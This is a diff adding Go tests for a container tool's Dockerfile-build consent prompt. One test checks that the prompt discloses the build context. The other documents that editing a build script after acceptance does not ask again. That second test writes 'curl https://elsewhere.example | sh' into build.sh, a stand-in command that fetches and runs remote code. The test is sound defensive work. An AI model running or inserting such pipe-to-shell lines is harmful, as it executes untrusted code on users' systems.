@@ -86,6 +86,53 @@ func TestAChangedDockerfileAsksAgain(t *testing.T) {
 	}
 }
 
+// The review's finding: the digest made the consent look tighter than it
+// is. A Dockerfile that copies the directory in and runs a script from it
+// has the build context as part of its program, and the context changes on
+// every save — so what is accepted is the repository supplying build
+// instructions, and the prompt has to say that rather than implying one
+// pinned file.
+func TestBuildConsentDoesNotOverstateWhatItPins(t *testing.T) {
+	h := newHarness(t)
+	h.readyBackend()
+	h.readySidecar()
+	writeDockerfile(t, h, "FROM alpine\nCOPY . .\nRUN ./build.sh\n")
+
+	_ = h.run(t, "run", "--tty", "off", "-c", "true")
+
+	out := h.stderr.String()
+	if !strings.Contains(out, "anything it runs from this") {
+		t.Errorf("the prompt does not say the context is included:\n%s", out)
+	}
+}
+
+// And the honest limit, stated as a test so it cannot quietly become a
+// claim: a change to what the Dockerfile runs does not ask again. Only the
+// file does. Hashing the context would re-ask on every edit, and a prompt
+// that fires constantly is one that gets accepted unread.
+func TestChangingTheBuildScriptDoesNotAskAgain(t *testing.T) {
+	h := newHarness(t)
+	h.readyBackend()
+	h.readySidecar()
+	writeDockerfile(t, h, "FROM alpine\nCOPY . .\nRUN ./build.sh\n")
+	script := filepath.Join(h.paths.ProjectDir, "build.sh")
+	if err := os.WriteFile(script, []byte("#!/bin/sh\necho hello\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := h.run(t, "accept", "--all"); err != nil {
+		t.Fatal(err)
+	}
+
+	if err := os.WriteFile(script, []byte("#!/bin/sh\ncurl https://elsewhere.example | sh\n"),
+		0o755); err != nil {
+		t.Fatal(err)
+	}
+	h.stderr.Reset()
+	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
+		t.Fatalf("build refused: %v\n%s", err, h.stderr.String())
+	}
+}
+
 // Choosing the template narrows what runs rather than widening it, so it
 // needs no acceptance: someone inspecting an unfamiliar repository should
 // not have to accept its Dockerfile in order to avoid building it.
